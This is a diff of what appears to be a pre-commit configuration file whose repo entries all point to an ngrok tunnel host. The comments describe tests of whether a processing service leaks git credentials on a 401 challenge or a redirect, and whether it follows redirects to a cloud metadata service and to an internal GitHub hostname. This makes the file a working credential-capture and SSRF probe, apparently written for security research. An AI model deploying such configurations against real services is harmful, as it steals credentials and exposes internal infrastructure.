@@ -1,18 +1,24 @@
 repos:
-  # Test 1: Redirect to github.com (triggers credential lookup in git)
-  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/cred-test
+  # Test A: 401 challenge - does git send credentials?
+  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/auth-test
     rev: v1.0.0
     hooks:
-      - id: test-hook
+      - id: auth-hook
 
-  # Test 2: Direct capture of any auth headers
-  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/capture
+  # Test B: Redirect to github.com - does excon/git follow with creds?
+  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/redir-github
     rev: v1.0.0
     hooks:
-      - id: capture-hook
+      - id: redir-hook
 
-  # Test 3: SSRF chain to metadata
-  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/ssrf-chain
+  # Test C: Redirect to metadata service
+  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/redir-meta
     rev: v1.0.0
     hooks:
-      - id: ssrf-hook
+      - id: meta-hook
+
+  # Test D: Redirect to internal github hostname
+  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/redir-internal
+    rev: v1.0.0
+    hooks:
+      - id: internal-hook
